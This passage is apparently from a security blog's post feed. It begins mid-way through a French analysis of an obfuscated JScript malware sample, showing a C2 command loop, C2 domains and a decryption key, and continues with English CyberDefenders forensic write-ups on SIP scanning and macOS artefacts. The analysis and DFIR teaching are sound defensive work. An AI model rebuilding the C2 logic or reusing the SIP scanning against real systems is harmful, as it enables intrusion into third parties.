d\u0026#39;utilisation: 7ÿ120 Mo\rEmplacements des fichiers d\u0026#39;‚change: C:\\pagefile.sys\rDomaine: WORKGROUP\rServeur d\u0026#39;ouverture de session: \\\\WINOUT\rCorrectif(s): 5 Corrections install‚es.\r[01]: KB5029921\r[02]: KB5012170\r[03]: KB5026039\r[04]: KB5030219\r[05]: KB5028756\rCarte(s) r‚seau: 4 carte(s) r‚seau install‚e(s).\r[01]: Intel(R) Ethernet Connection (4) I219-LM\rNom de la connexionÿ: Ethernet\rtatÿ: Support d‚connect‚\r[02]: Intel(R) Dual Band Wireless-AC 8265\rNom de la connexionÿ: Wi-Fi\rDHCP activ‚ÿ: Oui\rServeur DHCPÿ: 10.0.0.1\rAdresse(s) IP\r[01]: 10.0.0.53\r[02]: fe80::e3e8:bd35:b540:b965\r[03]: Bluetooth Device (Personal Area Network)\rNom de la connexionÿ: Connexion r‚seau Bluetooth\rtatÿ: Support d‚connect‚\r[04]: VirtualBox Host-Only Ethernet Adapter\rNom de la connexionÿ: Ethernet 2\rDHCP activ‚ÿ: Non\rAdresse(s) IP\r[01]: \u0026lt;IP\u0026gt;\r[02]: \u0026lt;address\u0026gt;\rConfiguration requise pour Hyper-V: Extensions de mode du moniteur d\u0026#39;ordinateur virtuelÿ: Oui\rVirtualisation activ‚e dans le microprogrammeÿ: Oui\rTraduction d\u0026#39;adresse de second niveauÿ: Oui\rPr‚vention de l\u0026#39;ex‚cution des donn‚es disponibleÿ: Oui Communication avec les C2 # La fonction centrale de se programme se trouve ici. Une boucle infinie var garder le programme vivant afin de permettre aux attaquants d\u0026rsquo;envoyer des commandes au programme.\nTout d\u0026rsquo;abord, le programme va envoyer au C2 les informations de la victime via une requête HTTP, avec un user-agent unique qui dépend de la machine infectée :\nKpxo.SETREQUESTHEADER(\u0026#34;user-agent:\u0026#34;, \u0026#34;Mozilla/5.0 (Windows NT 6.1; Win64; x64); \u0026#34; + get_victim_id()); Les informations semblent chiffrées via un algorithme maison. Ensuite, un switch/case indique les différentes commandes que le programme peut recevoir du C2 avant de se mettre en dormance pour une durée d\u0026rsquo;environ une heure :\nswitch (f3cb) { case \u0026#34;good\u0026#34;: break; case \u0026#34;exit\u0026#34;: WScript.Quit(); break; case \u0026#34;work\u0026#34;: work(Ysyo); break; case \u0026#34;fail\u0026#34;: fail(); break; default: break; } //... WScript.Sleep((Math.random() * 300 + 3600) * 1000); La fonction work semble télécharger le payload, le lancer et envoyer l\u0026rsquo;information au C2 si le lancement à réussi, sans chercher à envoyer l\u0026rsquo;erreur.\nLa fonction fail, quant à elle, créée une tâche planifiée avant de la supprimer aussitôt et quitte le programme.\nAnalyse de la menace # Il est ici question d\u0026rsquo;aller plus loin que la lecture de code. Mon objectif est de monter dans la Pyramide de la douleur ; aller plus loin que l\u0026rsquo;extraction habituelle d\u0026rsquo;IoCs comme des IP ou des noms de domaine mais essayer de comprendre la cible de ce malware et les objectifs de leurs auteurs. Cette analyse est sujet à mes interprétations.\nA mon sens, ce code malveillant n\u0026rsquo;a pas été créé par un APT et n\u0026rsquo;est pas non plus à son usage. Plusieurs indications vont dans ce sens, à commencer par le fait qu\u0026rsquo;aucun message d\u0026rsquo;erreur n\u0026rsquo;est envoyé vers les C2. Il n\u0026rsquo;y a pas la volonté de compromettre à tout prix la machine sur laquelle est présent le document. De plus, le code n\u0026rsquo;a pas l\u0026rsquo;air de contenir une détection de VM, il n\u0026rsquo;y a pas la volonté de se protéger contre les analystes. Cependant, il est possible que les informations de reconnaissance envoyés aux C2 puissent servir à cet usage. Enfin, les dates du déclenchement de la tâche planifiée, et donc par extension du malware final, ne sont pas précises. Tout cela tend à montrer qu\u0026rsquo;il n\u0026rsquo;y a pas un ciblage particulier.\nDe plus, la reconnaissance est automatisée et particulièrement bruyante. Les commandes sont lancées les unes à la suite des autres et net user, par exemple, est un marqueur très fort pour tout analyste SOC. Dans le même esprit, les noms de domaines utilisées (http://www.saipadiesel124.com/ et http://www.folk-cantabria.com/) pourraient sembler suspects pour un analyste SOC, à cause de leur nom, d\u0026rsquo;une part, mais également à cause du trafic en HTTP, d\u0026rsquo;autre part.\nL\u0026rsquo;exécution finale du script est plus obfusquée que le reste du code (WScriptShell), à mon sens, cela traduit la volonté de ne pas déclencher un antivirus. Un dernier élément plus spéculatif est l\u0026rsquo;utilisation de la clef de chiffrement EzZETcSXyKAdF_e5I2i1, qui a été utilisée pour déchiffrer une partie du code JScript, et qui pourrait être utilisée de nouveau pour déchiffrer le malware final. La cible pourrait donc être une entreprise très faiblement protégée voire un poste non monitoré d\u0026rsquo;un particulier.\nEnfin, le payload est exécuté uniquement quand l\u0026rsquo;utilisateur est connecté et la reconnaissance traduit une volonté de se latéraliser ; les pirates partant du principe que le malware peut se trouver sur un poste sans intérêt. De plus, l\u0026rsquo;utilisation, par les C2, de Wordpress peut laisser penser à une industrialisation de l\u0026rsquo;infrastructure, et, par extension, d\u0026rsquo;une recherche de rentabilité.\nEn conclusion, il semblerait que ce code soit à destination d\u0026rsquo;une cible peu protégée, peu monitorée et peu ou pas ciblée. Cela indique que les pirates ratissent large, probablement dans un but financier.\n","date":"10 octobre 2023","permalink":"/posts/jscript-et-threat-intelligence/","section":"Mes articles","summary":"Il y a quelques temps, j\u0026rsquo;ai résolu le challenge Obfuscated de Cyberdefenders.","title":"JScript et threat intelligence : analyse d'un code malveillant"},{"content":"The scenario:\nThis challenge takes you into the world of voice communications on the internet. VoIP is becoming the de-facto standard for voice communication. As this technology becomes more common, malicious parties have more opportunities and stronger motives to control these systems to conduct nefarious activities. This challenge was designed to examine and explore some of the attributes of the SIP and RTP protocols.\nAbstract # The article delves into the realm of voice communications on the internet, focusing on Voice over Internet Protocol (VoIP) technology. VoIP has become the standard for voice communication, but with its widespread adoption comes the risk of malicious exploitation. This challenge explores the Session Initiation Protocol (SIP) and Real-Time Transport Protocol (RTP) attributes to understand and counteract potential threats.\nA series of questions guide the exploration, covering topics such as identifying the transport protocol, suites of scanning tools, User-Agent of the victim system, extensions requiring authentication, scanned extensions, real SIP client traces, dialed phone numbers, default credentials, RTP codec usage, sampling time, and uncovering hidden messages.\nSIPVicious OSS logo; SIP-based VoIP systems security testing toolset. Q1. What is the transport protocol being used? # The first thing I like to do with Wireshark is to have an overview. Statistics \u0026gt; Protocol Hierarchy provides general information about the capture.\nCapture overview. We can see two unusual protocols here: Session Initiation Protocol and Real-Time Transport Protocol. According to the SIP\u0026rsquo;s Wikipedia page:\nSIP is designed to be independent of the underlying transport layer protocol and can be used with the User Datagram Protocol (UDP), the Transmission Control Protocol (TCP), and the Stream Control Transmission Protocol (SCTP).\nIn the statistics, we can see that SIP is under UDP.\nQ2. The attacker used a bunch of scanning tools that belong to the same suite. Provide the name of the suite. # I used the log file:\nOPTIONS sip:100@honey.pot.IP.removed SIP/2.0 Via: SIP/2.0/UDP 127.0.0.1:5061;branch=z9hG4bK-2159139916;rport Content-Length: 0 From: \u0026#34;sipvicious\u0026#34;\u0026lt;sip:100@1.1.1.1\u0026gt;; tag=X_removed Accept: application/sdp User-Agent: friendly-scanner To: \u0026#34;sipvicious\u0026#34;\u0026lt;sip:100@1.1.1.1\u0026gt; Contact: sip:100@127.0.0.1:5061 CSeq: 1 OPTIONS Call-ID: 845752980453913316694142 Max-Forwards: 70 The user-agent is a good starting point, as I don\u0026rsquo;t now anything in VoIP. Googling friendly-scanner will give some informations and especially this one:\nAlso known as friendly-scanner, it is freely available to help pentesters, security teams and developers quickly test their SIP systems.\nFrom: SIPVicious OSS - open-source tools for testing VoIP security.\nQ3. What is the User-Agent of the victim system? # Thanks to the hit, I have to check SIP packets. Filter this protocol by typing \u0026lsquo;sip\u0026rsquo; in the Wireshark\u0026rsquo;s search bar. Then, follow a conversation (right-click \u0026gt; follow \u0026gt; UDP stream) and you will see this kind of datas:\nOPTIONS sip:100@172.25.105.40 SIP/2.0 Via: SIP/2.0/UDP 127.0.1.1:5060;branch=z9hG4bK-1453809699;rport Content-Length: 0 From: \u0026#34;sipvicious\u0026#34;\u0026lt;sip:100@1.1.1.1\u0026gt;; tag=6163313936393238313363340131323031353530343335 Accept: application/sdp User-Agent: UNfriendly-scanner - for demo purposes To: \u0026#34;sipvicious\u0026#34;\u0026lt;sip:100@1.1.1.1\u0026gt; Contact: sip:100@127.0.1.1:5060 CSeq: 1 OPTIONS Call-ID: 61127078793469957194131 Max-Forwards: 70 SIP/2.0 200 OK Via: SIP/2.0/UDP 127.0.1.1:5060;branch=z9hG4bK-1453809699;received=172.25.105.43;rport=5060 From: \u0026#34;sipvicious\u0026#34;\u0026lt;sip:100@1.1.1.1\u0026gt;; tag=6163313936393238313363340131323031353530343335 To: \u0026#34;sipvicious\u0026#34;\u0026lt;sip:100@1.1.1.1\u0026gt;;tag=as18cdb0c9 Call-ID: 61127078793469957194131 CSeq: 1 OPTIONS User-Agent: Asterisk PBX 1.6.0.10-FONCORE-r40 Allow: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY Supported: replaces, timer Contact: \u0026lt;sip:172.25.105.40\u0026gt; Accept: application/sdp Content-Length: 0 Q4. Which tool was only used against the following extensions: 100,101,102,103, and 111? # SIP Vicious contains few tools:\nsvmap\nsvwar\nsvcrack\nsvreport\nsvcrash\nI used hints and gone to source code of each tools. You have to read each tool code and in svcrack there is an interesting function:\nfrom sipvicious.libs.svhelper import ...makeRequest This function is interesting because its used to forge the request and send it to the victim, you can find usefull information inside it:\ndef makeRequest(method, fromaddr, toaddr, dsthost, port, callid, srchost=\u0026#39;\u0026#39;, branchunique=None, cseq=1, auth=None, localtag=None, compact=False, contact=\u0026#39;sip:123@1.1.1.1\u0026#39;, accept=\u0026#39;application/sdp\u0026#39;, contentlength=None, localport=5060, extension=None, contenttype=None, body=\u0026#39;\u0026#39;, useragent=\u0026#39;friendly-scanner\u0026#39;, requesturi=None): Because of the useragent variable, which match logged user-agent inside log.txt, we can answer svcrack.py.\nQ5. Which extension on the honeypot does NOT require authentication? # I searched on log.txt, in this file you can find some Authorization header:\nAuthorization: Digest username=\u0026#34;101\u0026#34;,realm=\u0026#34;localhost\u0026#34;,nonce=\u0026#34;3711809134\u0026#34;,uri=\u0026#34;sip:honey.pot.IP.removed\u0026#34;,response=\u0026#34;MD5_hash_removedXXXXXXXXXXXXXXXX\u0026#34;,algorithm=MD5 It looks like an authentication, and, in this case, for user 101. I\u0026rsquo;ve looked for the same header for user 100, 101, 102 and 103, and the only one that doesn\u0026rsquo;t have this header is 100.\nQ6. How many extensions were scanned in total? # I wasn\u0026rsquo;t able to find the answer, I found something close to the answer but I haven\u0026rsquo;t been able to find the answer. Please refer to another write-up for an explaination.\nQ7. There is a trace for a real SIP client. What is the corresponding user-agent? (two words, once space in between) # Use a grep regex to find all the User-Agent:\ngrep -Ei \u0026#39;User-Agent:\u0026#39; log.txt|uniq Q8. Multiple real-world phone numbers were dialed. Provide the first 11 digits of the number dialed from extension 101? # As I don\u0026rsquo;t know anything about SIP, I asked to ChatGPT how to find a dialed phone number. It answered me that you have to check INVITE request type. This command search for extension 101 with INVITE type.\ngrep -Ei \u0026#39;From: \u0026#34;Unknown\u0026#34;\u0026lt;sip:101\u0026#39; log.txt -B8|grep INVITE It returns 3 matchs:\nINVITE sip:900114382089XXXX@honey.pot.IP.removed;transport=UDP SIP/2.0 INVITE sip:00112322228XXXX@honey.pot.IP.removed;transport=UDP SIP/2.0 INVITE sip:00112524021XXXX@honey.pot.IP.removed;transport=UDP SIP/2.0 We can forget the first one because it\u0026rsquo;s not 11 digit long. I don\u0026rsquo;t know why it\u0026rsquo;s the last one, both of them have an INVITE request for extension 101. Maybe I forget something?\nQ9. What are the default credentials used in the attempted basic authentication? (format is username:password) # Search for \u0026lsquo;password\u0026rsquo; in Wireshark: Edit \u0026gt; Find a packet (don\u0026rsquo;t forget to search for a string). In the HTTP paquets, you will find the credentials.\nQ11. Which codec does the RTP stream use? (3 words, 2 spaces in between) # Filter the capture on RTP packet type and open one of them. There is no codec field but there is payload type, searching on \u0026ldquo;rtp codec\u0026rdquo; I found this page: RTP payload formats - Wikipedia. In fact, the RTP payload format is related to the codec used:\nITU-T G.711 PCM A-Law audio 64 kbit/s\nIt looks like a codec, we found it!\nQ12. How long is the sampling time (in milliseconds)? # Not really a DFIR question^^.\nGo to G.711 - Wikipedia, you will find that the sampling frequency is 8kHz, 8000 times per second. To get the time between two samples, just calculate 1/8000 = 0.000125. As we want millisecond, multiply it by 1000 = 0.125.\nQ13. What was the password for the account with username 555? # The capture contains HTTP packets which seems related to the VoIP system interface. I extracted the HTTP objects but without find the answer.\nThe hint \u0026rsquo;take a look at sip_custom.conf\u0026rsquo; helped me a lot. I found packet number 1287 which contains many informations such as passwords:\n\u0026lt;form name=\u0026#34;section_form\u0026#34; method=\u0026#34;post\u0026#34; action=\u0026#34;?file=sip_custom.conf\u0026#34;\u0026gt; \u0026lt;input type=hidden name=\u0026#34;themd5\u0026#34; value=\u0026#34;ee6207b44f73896fd799ad41c9e20947\u0026#34;\u0026gt; \u0026lt;input type=hidden name=\u0026#34;updateSection\u0026#34; value=\u0026#34;sip_custom.conf\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Edit: sip_custom.conf\u0026lt;/h2\u0026gt; \u0026lt;textarea name=\u0026#34;section_text\u0026#34; cols=100 rows=\u0026#34;30\u0026#34; wrap=\u0026#34;off\u0026#34;\u0026gt;[555] type=friend username=555 secret=1234 Q14. Which RTP packet header field can be used to reorder out of sync RTP packets in the correct sequence? # I found two header field:\nSequence number\nTimestamp\nI tried both, the answer is Timestamp, maybe Sequence number can be used for this feature too.\nQ15. The trace includes a secret hidden message. Can you hear it? # Wireshark has the tool, go to : Telephony \u0026gt; RTP \u0026gt; RTP Player.\n","date":"3 septembre 2023","permalink":"/write-up/cyberdefenders-acoustic/","section":"Write-up","summary":"The scenario:\nThis challenge takes you into the world of voice communications on the internet.","title":"Cyberdefenders · Digital Forensic · Acoustic"},{"content":"The scenario:\nSpotlight is a MAC OS image forensics challenge where you can evaluate your DFIR skills against an OS you usually encounter in today\u0026rsquo;s case investigations as a security blue team member.\nMacOSX Catalina - the version in this forensic case. Abstract # The article presents a MAC OS image forensics challenge known as \u0026ldquo;Spotlight.\u0026rdquo; The challenge assesses digital forensics and incident response (DFIR) skills in dealing with macOS systems. I documents my exploration using various tools, including FTKImager, Autopsy, and mac_apt, while tackling a series of questions related to the challenge.\nThe questions cover a range of topics such as identifying the macOS version, extracting information from image files, examining Safari bookmarks, retrieving data from Notes, obtaining network information, investigating quarantined items, identifying app installations, tracking permission changes, uncovering steganography, accessing user history, and finding user UUIDs.\nThe article showcases my problem-solving approach, tool utilization, and detailed steps to answer each question, offering insights into macOS forensics challenges and methodologies.\nI tried to extract files with FTKImager then perform analysis with Autopsy (you can find more detailed steps in my previous WU) but unfortunately it can\u0026rsquo;t parse many artifacts. It\u0026rsquo;s maybe possible to setup Autopsy to process macOS images but I wanted to learn a new tool: mac_apt.\nQ1. What version of macOS is running on this image? # I wanted to run all the mac_apt plugins using this command:\n\u0026gt; ios_apt.exe -i APFS\\\\Vol4\\\\root -o ios_apt_output\\\\fsevents ALL Output path was : ios_apt_output\\fsevents MAIN-INFO-Started iOS Artifact Parsing Tool, version 1.5.8.dev (20230617) MAIN-INFO-Dates and times are in UTC unless the specific artifact being parsed saves it as local time! MAIN-INFO-Python version = 3.10.7 (tags/v3.10.7:6cc6b13, Sep 5 2022, 14:08:36) [MSC v.1933 64 bit (AMD64)] MAIN-INFO-Pytsk version = 20221228 MAIN-INFO-Pyewf version = 20230212 MAIN-INFO-Pyvmdk version = 20221124 MAIN-INFO-PyAFF4 version = 0.31 MAIN.HELPERS.MACINFO-INFO-iOS version detected is: Mac OS X (10.15) Build=19A583 ... The output provides lot of informations but at the top there is the Mac OS version.\nQ2. What \u0026ldquo;competitive advantage\u0026rdquo; did Hansel lie about in the file AnotherExample.jpg? (two words) # It\u0026rsquo;s more like a CTF question than a Blue Team one.\nIf you are familiar with Unix/MacOs filesystem you will easily find AnotherExample.jpg (APFS\\Data\\root\\Users\\Shared). First, I thought that the advantage was \u0026lsquo;Futur Phone\u0026rsquo;, as it\u0026rsquo;s written on the image. Instead, you had to extracts strings from the file and you will find the answer inside.\nQ3. How many bookmarks are registered in safari? # Autopsy can parse few things from the dump and bookmarks are part of it! Or, you can find this information here: macOS Catalina - Data [volume_0]/root/Users/hansel.apricot/Library/Safari/Bookmarks.plist.\nQ4. What\u0026rsquo;s the content of the note titled \u0026ldquo;Passwords\u0026rdquo;? # I tried to recursively search for a filename named \u0026ldquo;Passwords\u0026rdquo; but it\u0026rsquo;s located in a db file, as you will see bellow. Googling where notes are located in MacOs I found this path: ~/Library/Containers/com.apple.Notes/Data/Library/Notes.\nOpen NoteStore.sqlite with your favorite tool and you will find in the ZICCLOUDSYNINOBJECT table, in the ZTITLE1 column, a note named Passwords. The ZSNIPPET does not show anything, maybe because the note is empty.\nQ5. Provide the MAC address of the ethernet adapter for this machine. # I found this very useful website: MAC FORENSICS PART 4 (MOUNTAIN LION 10.8 – SYSTEM FILE ARTIFACTS), it provides the path to see MAC address: /private/var/log/daily.out. In this file we can see some reports about the system, included network informations:\nNetwork interface status: Name Mtu Network Address Ipkts Ierrs Opkts Oerrs Coll lo0 16384 \u0026lt;Link#1\u0026gt; 1072 0 1072 0 0 lo0 16384 127 localhost 1072 - 1072 - - lo0 16384 localhost ::1 1072 - 1072 - - lo0 16384 fe80::1%lo0 fe80:1::1 1072 - 1072 - - gif0* 1280 \u0026lt;Link#2\u0026gt; 0 0 0 0 0 stf0* 1280 \u0026lt;Link#3\u0026gt; 0 0 0 0 0 en0 1500 \u0026lt;Link#4\u0026gt; 00:0c:29:c4:65:77 372733 0 73025 0 0 Q6. Name the data URL of the quarantined item. # By using Powhershell to recursively search for filename I found this location:\n\u0026gt; Get-Childitem .\\APFS\\ *quarantine* -Recurse \\APFS\\Data\\root\\Users\\sneaky\\Library\\Preferences Mode LastWriteTime Length Name ---- ------------- ------ ---- ------ 4/20/2020 5:58 AM 20480 com.apple.LaunchServices.QuarantineEventsV2 This is a SQLite database, open it, the column LSQuarantineDataURLString contains the URL where the quarantined file was downloaded: https://futureboy.us/stegano/encode.pl.\nQ7. What app did the user \u0026ldquo;sneaky\u0026rdquo; try to install via a .dmg file? (one word) # Once again, I used powershell to find all the dmg file (disk image file to store compressed software installer on Mac):\n\u0026gt; Get-Childitem .\\APFS\\ *.dmg -Recurse Directory: APFS\\Data\\root\\Users\\sneaky\\.Trash Mode LastWriteTime Length Name ---- ------------- ------ ---- ------ 4/20/2020 5:30 AM 26633714 silenteye-0.4.1b-snowleopard.dmg Silenteye is a software used for steganography; hidding information into files like pictures or sound.\nQ8. What was the file \u0026lsquo;Examplesteg.jpg\u0026rsquo; renamed to? # I had some troubles with mac_apt, for technical reasons I couldn\u0026rsquo;t used source file (Python problems during requirements installations) and the exe file returns an error during my investigation (see bellow). I had to trick the software to go forward.\nA good idea is to use the FSEVENTS plugin from mac_apt, according to the doc :\nReads file system event logs (from .fseventsd)\nAs we have two partitions, I run the plugin on Vol4:\n\u0026gt; ./ios_apt.exe -i APFS\\Vol4\\root -o ios_apt_output\\fsevents FSEVENTS ... In ios_apt_output\\fsevents a file was created: ios_apt.db. It\u0026rsquo;s a SQLite db:\nMacOS file system event logs view. Filepath is the key here, we can try a SQL query to find any information related to Examplesteg.jpg:\nselect * from FsEvents where Filepath like \u0026#39;%Examplesteg.jpg%\u0026#39; Execution finished without errors. Result: 0 rows returned There is no data related to our interesting file but let\u0026rsquo;s investigate on the second partition logs:\n\u0026gt; ./ios_apt.exe -i APFS\\Data\\root -o ios_apt_output\\fsevents FSEVENTS MAIN-ERROR-Could not find iOS system version! :( Could not find an iOS installation on path provided. Make sure you provide the path to the root folder. This folder should contain folders \u0026#39;bin\u0026#39;, \u0026#39;System\u0026#39;, \u0026#39;private\u0026#39;, \u0026#39;Library\u0026#39; and others. This is where the trick begins, it looks like a bug for exe file, as source file don\u0026rsquo;t returns this error. The program wants bin, System, \u0026hellip; let\u0026rsquo;s provides them!\nJust copy the missing files from Vol4/root to Data/root and the tool will not trigger errors! Be carreful, in real world forensic case, this kind of manipulation can corrupt your evidences for judges or lawyers.\nOn this second db we have datas related to our file:\nMacOS file system event logs view for Examplesteg.jpg. Note the File_ID (12885043806), and search on it:\nEvent logs for file id no 12885043806. Order the LogID column to get the bigger one (i.e: the most recent) in the Filepath you have the new file name!\nQ9. How much time was spent on mail.zoho.com on 4/20/2020? # I didn\u0026rsquo;t understand how the system count minutes on a given website. Using Autopsy and web history I could retrieved when user accessed to mail.zoho.com and when he leaved, but timestamp didn\u0026rsquo;t matched with RMAdminStore-Local.sqlite db (see other WU). On this db, run the SCREENTIME plugin and you will find durations.\nQ10. What\u0026rsquo;s hansel.apricot\u0026rsquo;s password hint? (two words) # Thanks to this website: MAC FORENSICS PART 4 (MOUNTAIN LION 10.8 – SYSTEM FILE ARTIFACTS) you can find the path where this information is stored: /private/var/db/dslocal/nodes/[user].plist. Extract and open the pslist file and the hint is Family Opinion.\nQ11. The main file that stores Hansel\u0026rsquo;s iMessages had a few permissions changes. How many times did the permissions change? # As we have the fsevents db from Data partition, we can use it to count the number of permission changed event. The iMessage db file is located at /Users/Mac/Library/Messages/chat.db, according to a quick web search.\nI was unable to find this db but we don\u0026rsquo;t need it to answer the question. We just have to search on chat.db and permissionChanged and count how many times the persmissions was changed.\niMessages db logs. Q12. What\u0026rsquo;s the UID of the user who is responsible for connecting mobile devices? # Kind of tricky question because you have to know several things:\nwhich kind of user is intended here? Regular one (human user), or \u0026ldquo;machine\u0026rdquo; user, i.e user attached to a particular task? Here it\u0026rsquo;s the second user type; \u0026ldquo;responsible for connecting mobile devices\u0026rdquo; means that this is a task performed by a dedicated user, or something similar.\nwhere should I find this kind of information? Maybe the least difficult question to answer here, as we already browsed user informations on Q10 (private/db/dslocal/nodes/Default/users/).\nwhich user should I have to investigate on? Most difficult one to me, on the directory there is tons of users. I searched MacOS mobile devices related user but I found nothing interesting. There is a process named usbmuxd which looks interesting because of the \u0026ldquo;USB\u0026rdquo;:\nUSBMUXD is a Mac OS X process that performs USB multiplexing when synchronizing iTunes music libraries with USB music devices like iPods \u0026amp; iPhones.\nIt sounds good, by opening its plist file (readable in Autopsy) we can see that its UID is 213.\nQ13. Find the flag in the GoodExample.jpg image. It\u0026rsquo;s hidden with better tools. # I followed the first tip, which is to investigate on FSEVENTS db (see previous questions), we can find that there is two location for GoodExample.jpg (second column is File_ID):\nUsers/Shared/GoodExample.jpg 12885043806 Users/sneaky/Downloads/GoodExample.jpg 12885043806 Then, I searched on File_ID:\nUsers/Shared/GoodExample.jpg Users/sneaky/Downloads/Example.jpg Users/sneaky/Downloads/Examplesteg.jpg Users/sneaky/Downloads/Examplesteg.jpg.download/Examplesteg.jpg Users/sneaky/Downloads/GoodExample.jpg The interesting thing to me is that most of the file are located in Downloads directory and have the same SourceModDate timestamp (2020-04-20 03:19:45). Maybe we should take a look at the users web history (Autopsy).\nFew hours before we can see several Google search:\nhide information in jpg\nHow to hide data within an image\nAnd, two websites related to steganography:\nhttps://null-byte.wonderhowto.com/how-to/steganography-hide-secret-data-inside-image-audio-file-seconds-0180936/\nhttps://www.computerhope.com/issues/ch000861.htm\nObviously, the user is not familiar with steganography and he used a tool like steghide. Searching for a reverse steghide online tool, I found this website: Steganographic Decoder. Upload the file and you will find the answer!\nConclusion: if you want to hide information, use very unusual algorithms!\nQ14. What was exactly typed in the Spotlight search bar on 4/20/2020 02:09:48 # Most of information found on Spotlight forensic was to find the Spotlight\u0026rsquo;s db located at ~/.Spotlight-V100/ but this file is not in this dump. I used a recursive search to locate all the spotlight related filename:\n\u0026gt; Get-Childitem .\\APFS\\ *.spotlight* -Recurse Directory: APFS\\Data\\root\\Users\\sneaky\\Library\\Application Support\\com.apple.spotlight Mode LastWriteTime Length Name ---- ------------- ------ ---- ------ 4/20/2020 5:44 AM 687 com.apple.spotlight.Shortcuts There is one of my results, open this file and you will get the answer in the key tag:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;silent\u0026lt;/key\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;DISPLAY_NAME\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;silenteye-0.4.1b-snowleopard_installer\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;LAST_USED\u0026lt;/key\u0026gt; \u0026lt;date\u0026gt;2020-04-20T02:44:27Z\u0026lt;/date\u0026gt; \u0026lt;key\u0026gt;URL\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;/Applications/silenteye-0.4.1b-snowleopard_installer.app\u0026lt;/string\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;key\u0026gt;term\u0026lt;/key\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;DISPLAY_NAME\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;Terminal\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;LAST_USED\u0026lt;/key\u0026gt; \u0026lt;date\u0026gt;2020-04-20T02:09:48Z\u0026lt;/date\u0026gt; \u0026lt;key\u0026gt;URL\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;/System/Applications/Utilities/Terminal.app\u0026lt;/string\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; An another way is to recursively search on the given date and open the shortcut file:\n\u0026gt; findstr /spin /c:\u0026#34;4-20\u0026#34; .\\APFS\\* ... .\\APFS\\Data\\root\\Users\\sneaky\\Library\\Application Support\\com.apple.spotlight\\com.apple.spotlight.Shortcuts:19: \u0026lt;date\u0026gt;2020-04-20T02:09:48Z\u0026lt;/date\u0026gt; ... Q15. What is hansel.apricot\u0026rsquo;s Open Directory user UUID? # Apple Open Directory is the LDAP directory service model implementation from Apple according to Wikipedia. My intuition was to use the generateduid value located in hansel.apricot.plist because it match the pattern and it\u0026rsquo;s an UID, by chance, it was the answer. Howerver, I found this topic: How is the UUID for a user used by macOS? - Ask Different:\nThe UUID (aka GeneratedUID, so Google that one instead) is used by Open Directory Services on macOS\n5BB00259-4F58-4FDE-BC67-C2659BA0A5A4\n","date":"3 septembre 2023","permalink":"/write-up/cyberdefenders-spotlight/","section":"Write-up","summary":"The scenario:\nSpotlight is a MAC OS image forensics challenge where you can evaluate your DFIR skills against an OS you usually encounter in today\u0026rsquo;s case investigations as a security blue team member.","title":"Cyberdefenders · Digital Forensic · Spotlight"},{"content":"The scenario:\nJohn Doe was accused of doing illegal activities. A disk image of his laptop was taken. Your task as a soc analyst is to analyze the image and understand what happened under the hood.\nAfrican falls illustration made by Midjourney. Abstract # The article describes a forensic challenge involving the analysis of a disk image from a laptop belonging to a suspect named John Doe, who is accused of illegal activities. The task for a SOC analyst is to uncover various pieces of information from the disk image, using a combination of tools including FTK Imager, Autopsy, command line utilities, and specialized tools like Metadata2go. The challenge consists of multiple questions aimed at extracting specific details, such as the MD5 hash value of the suspect\u0026rsquo;s disk, phrases searched, connected FTP server\u0026rsquo;s IPv4 address, deleted files, Tor Browser usage, email address, network port scan details, photo metadata, and more.\nThe article provides detailed instructions on how to approach each question, highlighting the use of relevant tools and demonstrating the steps to extract the required information from the disk image. It involves analyzing a variety of artifacts, including web history, installed programs, file metadata, PowerShell history, and system registry data. The challenge concludes with insights into retrieving password hashes and cracking them to determine the user\u0026rsquo;s Windows login password.\nFirst, mount the image using FTK Imager (Windows) or command lines tools (Linux), follow this very good tutorial: Guide: mounting challenge disk image on Linux..\nImportant: AD1 files are painfull to use with Autopsy, If you want to analyse AD1 file with this software, you will have troubles. As Autopsy is very powerfull and embed various parsing tools, it\u0026rsquo;s convenient to use it. My method is to:\nMount AD1 file with FTK Imager\nExport files using FTK Imager (right-click \u0026gt; Export files)\nIn Autopsy, Add Data Source \u0026gt; Logical Files \u0026gt; Add (select the previously exported files)\nData ingestion should now works :)\nQ1. What is the MD5 hash value of the suspect disk? # Image file creation log provides this information, check the DiskDrigger.txt you will find various information such as the MD5 hash.\nQ2. What phrase did the suspect search for on 2021-04-29 18:17:38 UTC? (three words, two spaces in between) # Under Data Artifacts \u0026gt; Web History, you get all the information, sort by time and you will find two URLs at the given time: password cracking lists - Google Search.\nOr, you can manually browe the history file here: Users\\John Doe\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History.\nQ3. What is the IPv4 address of the FTP server the suspect connected to? # Little bit tricky as you must know the most famous FTP client: FileZilla. To know if the software is installed go to Data Artifacts \u0026gt; Installed Programs, there is FileZilla, let\u0026rsquo;s read its log file.\nIf you don\u0026rsquo;t have Autopsy you can browse SOFTWARE hive, you will find FileZilla too.\nSo FileZilla is installed, what\u0026rsquo;s next? Application datas are located at Users/\u0026lt;Username\u0026gt;/AppData/Roaming|Local/AppData/ where Roaming|Local means that you have to browse theses two directories. The main difference is that roaming datas will \u0026ldquo;follow\u0026rdquo; a user throught another domains, and local will not. During my forensic learning journey, I can say that sometimes it\u0026rsquo;s located at Roaming, sometimes at Local, you have to dig into both.\nDigging into Local/FileZilla is useless, there is only icons and stuff like that, not user datas. Roaming/FileZilla/ contains xml files and especially recentservers.xml. There is our answer!\nQ4. What date and time was a password list 